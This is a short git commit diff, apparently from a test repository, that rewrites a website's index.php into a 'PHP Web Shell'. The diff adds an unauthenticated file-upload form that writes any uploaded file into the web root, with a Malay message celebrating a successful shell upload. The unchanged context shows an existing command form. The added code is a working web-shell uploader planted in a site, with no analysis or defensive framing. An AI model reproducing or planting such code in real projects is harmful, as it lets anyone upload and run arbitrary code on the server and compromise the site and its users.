61401989851aa0d1c33f957c104cb041126023a6
hagaikestest <141217192+hagaikestest@users.noreply.github.com>
2023-08-02 11:43:34 +0300

    shell n shell

--- index.php
+++ index.php
@@ -1,8 +1,19 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>SNR website</title>
+
+<head>
+    <title>PHP Web Shell</title>
   </head>
+
+<?php
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+if( $_POST['_upl'] == "Upload" ) {
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Korang Dah Berjaya Upload Shell Korang!!!<b><br><br>'; }
+else { echo '<b>uploaded!</b><br><br>'; }
+}
+?>
+  
   <body>
     <h1>PHP Web Shell</h1>
     <form method="POST">
@@ -19,3 +30,6 @@
     ?>
   </body>
 </html>
+
+
+
